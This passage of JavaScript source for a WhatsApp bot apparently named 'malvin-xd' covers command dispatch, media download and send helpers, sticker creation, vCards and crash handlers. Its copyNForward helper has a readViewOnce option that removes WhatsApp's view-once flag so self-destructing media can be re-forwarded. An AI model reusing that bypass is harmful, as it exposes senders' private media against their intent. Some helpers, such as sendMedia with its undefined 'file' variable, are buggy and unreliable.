          cmd.function(malvin, mek, m, {
            from,
            quoted,
            body,
            isCmd,
            command,
            args,
            q,
            text,
            isGroup,
            sender,
            senderNumber,
            botNumber2,
            botNumber,
            pushname,
            isMe,
            isOwner,
            isCreator,
            groupMetadata,
            groupName,
            participants,
            groupAdmins,
            isBotAdmins,
            isAdmins,
            reply,
          });
          logger.success("[ ✅ ] Command executed", {
            Sender: sender,
            Chat: from,
            Command: command,
            Args: args.join(" "),
          });
        } catch (e) {
          logger.error("[ ❌ ] Plugin error", { Error: e.message });
        }
      }
    }
    events.commands.map(async (command) => {
      if (body && command.on === "body") {
        command.function(malvin, mek, m, {
          from,
          l,
          quoted,
          body,
          isCmd,
          command,
          args,
          q,
          text,
          isGroup,
          sender,
          senderNumber,
          botNumber2,
          botNumber,
          pushname,
          isMe,
          isOwner,
          isCreator,
          groupMetadata,
          groupName,
          participants,
          groupAdmins,
          isBotAdmins,
          isAdmins,
          reply,
        });
        logger.info("[ 📡 ] Body event triggered", {
          Sender: sender,
          Chat: from,
          Text: body,
        });
      } else if (mek.q && command.on === "text") {
        command.function(malvin, mek, m, {
          from,
          l,
          quoted,
          body,
          isCmd,
          command,
          args,
          q,
          text,
          isGroup,
          sender,
          senderNumber,
          botNumber2,
          botNumber,
          pushname,
          isMe,
          isOwner,
          isCreator,
          groupMetadata,
          groupName,
          participants,
          groupAdmins,
          isBotAdmins,
          isAdmins,
          reply,
        });
        logger.info("[ 📡 ] Text event triggered", {
          Sender: sender,
          Chat: from,
          Text: q,
        });
      } else if (command.on === "image" || (command.on === "photo" && mek.type === "imageMessage")) {
        command.function(malvin, mek, m, {
          from,
          l,
          quoted,
          body,
          isCmd,
          command,
          args,
          q,
          text,
          isGroup,
          sender,
          senderNumber,
          botNumber2,
          botNumber,
          pushname,
          isMe,
          isOwner,
          isCreator,
          groupMetadata,
          groupName,
          participants,
          groupAdmins,
          isBotAdmins,
          isAdmins,
          reply,
        });
        logger.info("[ 📡 ] Image event triggered", {
          Sender: sender,
          Chat: from,
        });
      } else if (command.on === "sticker" && mek.type === "stickerMessage") {
        command.function(malvin, mek, m, {
          from,
          l,
          quoted,
          body,
          isCmd,
          command,
          args,
          q,
          text,
          isGroup,
          sender,
          senderNumber,
          botNumber2,
          botNumber,
          pushname,
          isMe,
          isOwner,
          isCreator,
          groupMetadata,
          groupName,
          participants,
          groupAdmins,
          isBotAdmins,
          isAdmins,
          reply,
        });
        logger.info("[ 📡 ] Sticker event triggered", {
          Sender: sender,
          Chat: from,
        });
      }
    });
  });

  //===================================================

  malvin.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
    } else return jid;
  };

  //===================================================
  malvin.copyNForward = async (jid, message, forceForward = false, options = {}) => {
    let vtype;
    if (options.readViewOnce) {
      message.message =
        message.message &&
        message.message.ephemeralMessage &&
        message.message.ephemeralMessage.message
          ? message.message.ephemeralMessage.message
          : message.message || undefined;
      vtype = Object.keys(message.message.viewOnceMessage.message)[0];
      delete (message.message && message.message.ignore ? message.message.ignore : message.message || undefined);
      delete message.message.viewOnceMessage.message[vtype].viewOnce;
      message.message = {
        ...message.message.viewOnceMessage.message,
      };
    }

    let mtype = Object.keys(message.message)[0];
    let content = await generateForwardMessageContent(message, forceForward);
    let ctype = Object.keys(content)[0];
    let context = {};
    if (mtype != "conversation") context = message.message[mtype].contextInfo;
    content[ctype].contextInfo = {
      ...context,
      ...content[ctype].contextInfo,
    };
    const waMessage = await generateWAMessageFromContent(
      jid,
      content,
      options
        ? {
            ...content[ctype],
            ...options,
            ...(options.contextInfo
              ? {
                  contextInfo: {
                    ...content[ctype].contextInfo,
                    ...options.contextInfo,
                  },
                }
              : {}),
          }
        : {}
    );
    await malvin.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
    return waMessage;
  };

  //=================================================
  malvin.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message;
    let mime = (message.msg || message).mimetype || "";
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, "") : mime.split("/")[0];
    const stream = await downloadContentFromMessage(quoted, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    let type = await FileType.fromBuffer(buffer);
    trueFileName = attachExtension ? filename + "." + type.ext : filename;
    // save to file
    await fs.writeFileSync(trueFileName, buffer);
    return trueFileName;
  };

  //=================================================
  malvin.downloadMediaMessage = async (message) => {
    let mime = (message.msg || message).mimetype || "";
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, "") : mime.split("/")[0];
    const stream = await downloadContentFromMessage(message, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }

    return buffer;
  };

  /**
   *
   * @param {*} jid
   * @param {*} message
   * @param {*} forceForward
   * @param {*} options
   * @returns
   */
  //================================================
  malvin.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
    let mime = "";
    let res = await axios.head(url);
    mime = res.headers["content-type"];
    if (mime.split("/")[1] === "gif") {
      return malvin.sendMessage(
        jid,
        { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options },
        { quoted: quoted, ...options }
      );
    }
    let type = mime.split("/")[0] + "Message";
    if (mime === "application/pdf") {
      return malvin.sendMessage(
        jid,
        { document: await getBuffer(url), mimetype: "application/pdf", caption: caption, ...options },
        { quoted: quoted, ...options }
      );
    }
    if (mime.split("/")[0] === "image") {
      return malvin.sendMessage(
        jid,
        { image: await getBuffer(url), caption: caption, ...options },
        { quoted: quoted, ...options }
      );
    }
    if (mime.split("/")[0] === "video") {
      return malvin.sendMessage(
        jid,
        { video: await getBuffer(url), caption: caption, mimetype: "video/mp4", ...options },
        { quoted: quoted, ...options }
      );
    }
    if (mime.split("/")[0] === "audio") {
      return malvin.sendMessage(
        jid,
        { audio: await getBuffer(url), caption: caption, mimetype: "audio/mpeg", ...options },
        { quoted: quoted, ...options }
      );
    }
  };

  //==========================================================
  malvin.cMod = (jid, copy, text = "", sender = malvin.user.id, options = {}) => {
    let mtype = Object.keys(copy.message)[0];
    let isEphemeral = mtype === "ephemeralMessage";
    if (isEphemeral) {
      mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
    }
    let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
    let content = msg[mtype];
    if (typeof content === "string") msg[mtype] = text || content;
    else if (content.caption) content.caption = text || content.caption;
    else if (content.text) content.text = text || content.text;
    if (typeof content !== "string")
      msg[mtype] = {
        ...content,
        ...options,
      };
    if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    if (copy.key.remoteJid.includes("@s.whatsapp.net")) sender = sender || copy.key.remoteJid;
    else if (copy.key.remoteJid.includes("@broadcast")) sender = sender || copy.key.remoteJid;
    copy.key.remoteJid = jid;
    copy.key.fromMe = sender === malvin.user.id;

    return proto.WebMessageInfo.fromObject(copy);
  };

  /**
   *
   * @param {*} path
   * @returns
   */
  //=====================================================
  malvin.getFile = async (PATH, save) => {
    let res;
    let data = Buffer.isBuffer(PATH)
      ? PATH
      : /^data:.*?\/.*?;base64,/i.test(PATH)
      ? Buffer.from(PATH.split`,`[1], "base64")
      : /^https?:\/\//.test(PATH)
      ? await (res = await getBuffer(PATH))
      : fs.existsSync(PATH)
      ? ((filename = PATH), fs.readFileSync(PATH))
      : typeof PATH === "string"
      ? PATH
      : Buffer.alloc(0);
    let type = await FileType.fromBuffer(data) || {
      mime: "application/octet-stream",
      ext: ".bin",
    };
    let filename = path.join(__filename, __dirname + new Date() * 1 + "." + type.ext);
    if (data && save) fs.promises.writeFile(filename, data);
    return {
      res,
      filename,
      size: await getSizeMedia(data),
      ...type,
      data,
    };
  };

  //=====================================================
  malvin.sendFile = async (jid, PATH, fileName, quoted = {}, options = {}) => {
    let types = await malvin.getFile(PATH, true);
    let { filename, size, ext, mime, data } = types;
    let type = "",
      mimetype = mime,
      pathFile = filename;
    if (options.asDocument) type = "document";
    if (options.asSticker || /webp/.test(mime)) {
      let { writeExif } = require("./exif.js");
      let media = { mimetype: mime, data };
      pathFile = await writeExif(media, {
        packname: Config.packname,
        author: Config.packname,
        categories: options.categories ? options.categories : [],
      });
      await fs.promises.unlink(filename);
      type = "sticker";
      mimetype = "image/webp";
    } else if (/image/.test(mime)) type = "image";
    else if (/video/.test(mime)) type = "video";
    else if (/audio/.test(mime)) type = "audio";
    else type = "document";
    await malvin.sendMessage(
      jid,
      {
        [type]: { url: pathFile },
        mimetype,
        fileName,
        ...options,
      },
      { quoted, ...options }
    );
    return fs.promises.unlink(pathFile);
  };

  //=====================================================
  malvin.parseMention = async (text) => {
    return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map((v) => v[1] + "@s.whatsapp.net");
  };

  //=====================================================
  malvin.sendMedia = async (jid, path, fileName = "", caption = "", quoted = "", options = {}) => {
    let types = await malvin.getFile(path, true);
    let { mime, ext, res, data, filename } = types;
    if (res && res.status !== 200 || file.length <= 65536) {
      try {
        throw { json: JSON.parse(file.toString()) };
      } catch (e) {
        if (e.json) throw e.json;
      }
    }
    let type = "",
      mimetype = mime,
      pathFile = filename;
    if (options.asDocument) type = "document";
    if (options.asSticker || /webp/.test(mime)) {
      let { writeExif } = require("./exif");
      let media = { mimetype: mime, data };
      pathFile = await writeExif(media, {
        packname: options.packname ? options.packname : Config.packname,
        author: options.author ? options.author : Config.author,
        categories: options.categories ? options.categories : [],
      });
      await fs.promises.unlink(filename);
      type = "sticker";
      mimetype = "image/webp";
    } else if (/image/.test(mime)) type = "image";
    else if (/video/.test(mime)) type = "video";
    else if (/audio/.test(mime)) type = "audio";
    else type = "document";
    await malvin.sendMessage(
      jid,
      {
        [type]: { url: pathFile },
        caption,
        mimetype,
        fileName,
        ...options,
      },
      { quoted, ...options }
    );
    return fs.promises.unlink(pathFile);
  };

  /**
   *
   * @param {*} message
   * @param {*} filename
   * @param {*} attachExtension
   * @returns
   */
  //=====================================================
  malvin.sendVideoAsSticker = async (jid, buff, options = {}) => {
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifVid(buff, options);
    } else {
      buffer = await videoToWebp(buff);
    }
    await malvin.sendMessage(jid, { sticker: { url: buffer }, ...options }, options);
  };

  //=====================================================
  malvin.sendImageAsSticker = async (jid, buff, options = {}) => {
    let buffer;
    if (options && (options.packname || options.author)) {
      buffer = await writeExifImg(buff, options);
    } else {
      buffer = await imageToWebp(buff);
    }
    await malvin.sendMessage(jid, { sticker: { url: buffer }, ...options }, options);
  };

  /**
   *
   * @param {*} jid
   * @param {*} path
   * @param {*} quoted
   * @param {*} options
   * @returns
   */
  //=====================================================
  malvin.sendTextWithMentions = async (jid, text, quoted, options = {}) =>
    malvin.sendMessage(
      jid,
      { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map((v) => v[1] + "@s.whatsapp.net") }, ...options },
      { quoted }
    );

  /**
   *
   * @param {*} jid
   * @param {*} path
   * @param {*} quoted
   * @param {*} options
   * @returns
   */
  //=====================================================
  malvin.sendImage = async (jid, path, caption = "", quoted = "", options) => {
    let buffer = Buffer.isBuffer(path)
      ? path
      : /^data:.*?\/.*?;base64,/i.test(path)
      ? Buffer.from(path.split`,`[1], "base64")
      : /^https?:\/\//.test(path)
      ? await (await getBuffer(path))
      : fs.existsSync(path)
      ? fs.readFileSync(path)
      : Buffer.alloc(0);
    return await malvin.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
  };

  /**
   *
   * @param {*} jid
   * @param {*} path
   * @param {*} caption
   * @param {*} quoted
   * @param {*} options
   * @returns
   */
  //=====================================================
  malvin.sendText = (jid, text, quoted = "", options) => malvin.sendMessage(jid, { text: text, ...options }, { quoted });

  /**
   *
   * @param {*} jid
   * @param {*} buttons
   * @param {*} caption
   * @param {*} footer
   * @param {*} quoted
   * @param {*} options
   */
  //=====================================================
  malvin.sendButtonText = (jid, buttons = [], text, footer, quoted = "", options = {}) => {
    let buttonMessage = {
      text,
      footer,
      buttons,
      headerType: 2,
      ...options,
    };
    malvin.sendMessage(jid, buttonMessage, { quoted, ...options });
  };

  //=====================================================
  malvin.send5ButImg = async (jid, text = "", footer = "", img, but = [], thumb, options = {}) => {
    let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: malvin.waUploadToServer });
    var template = generateWAMessageFromContent(
      jid,
      proto.Message.fromObject({
        templateMessage: {
          hydratedTemplate: {
            imageMessage: message.imageMessage,
            hydratedContentText: text,
            hydratedFooterText: footer,
            hydratedButtons: but,
          },
        },
      }),
      options
    );
    malvin.relayMessage(jid, template.message, { messageId: template.key.id });
  };

  /**
   *
   * @param {*} jid
   * @param {*} buttons
   * @param {*} caption
   * @param {*} footer
   * @param {*} quoted
   * @param {*} options
   */
  //=====================================================
  malvin.getName = (jid, withoutContact = false) => {
    id = malvin.decodeJid(jid);
    withoutContact = malvin.withoutContact || withoutContact;
    let v;
    if (id.endsWith("@g.us"))
      return new Promise(async (resolve) => {
        v = store.contacts[id] || {};
        if (!(v.name.notify || v.subject)) v = malvin.groupMetadata(id) || {};
        resolve(v.name || v.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
      });
    else
      v =
        id === "0@s.whatsapp.net"
          ? {
              id,
              name: "WhatsApp",
            }
          : id === malvin.decodeJid(malvin.user.id)
          ? malvin.user
          : store.contacts[id] || {};
    return (withoutContact ? "" : v.name) || v.subject || v.verifiedName || PhoneNumber("+" + jid.replace("@s.whatsapp.net", "")).getNumber("international");
  };

  // Vcard Functionality
  malvin.sendContact = async (jid, kon, quoted = "", opts = {}) => {
    let list = [];
    for (let i of kon) {
      list.push({
        displayName: await malvin.getName(i + "@s.whatsapp.net"),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await malvin.getName(i + "@s.whatsapp.net")}\nFN:${global.OwnerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github}/malvin-xd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
      });
    }
    malvin.sendMessage(
      jid,
      {
        contacts: {
          displayName: `${list.length} Contact`,
          contacts: list,
        },
        ...opts,
      },
      { quoted }
    );
  };

  // Status aka brio
  malvin.setStatus = (status) => {
    malvin.query({
      tag: "iq",
      attrs: {
        to: "@s.whatsapp.net",
        type: "set",
        xmlns: "status",
      },
      content: [
        {
          tag: "status",
          attrs: {},
          content: Buffer.from(status, "utf-8"),
        },
      ],
    });
    return status;
  };

  malvin.serializeM = (mek) => sms(malvin, mek, store);
};

// Anti-crash handler
process.on("uncaughtException", (err) => {
  logger.error(`[❗] Uncaught Exception`, { Error: err.stack || err });
});

process.on("unhandledRejection", (reason, p) => {
  logger.error(`[❗] Unhandled Promise Rejection`, { Reason: reason });
});

setTimeout(() => {
  connectToWA();
}, 4000);